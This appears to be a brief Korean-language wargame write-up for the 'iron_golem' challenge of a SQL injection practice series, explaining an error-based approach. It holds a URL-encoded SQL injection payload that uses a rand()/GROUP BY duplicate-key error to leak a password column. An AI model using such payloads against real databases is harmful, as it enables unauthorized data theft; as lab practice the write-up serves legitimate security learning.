# LOS2 - iron_golem

문제 PHP를 보면 문제의 의도를 only error based로 좁혀놨다. 그래서 그대로 풀었다.

%27%20or%20(select%20concat(ceil(rand(0)*2),pw)%20as%20x%20from%20(select%201%20union%20select%202%20union%20select%203)t%20group%20by%20x%20having%20min(0))%20--%20-

으음 그렇게 푸는 것이 아니라 한번에 빼올 수 있다

중복되는 el 값을 만들어서 에러에 호출하게 만든다.

다음문제야 말로 이 코드로 그대로 풀면 ㅅㅅ
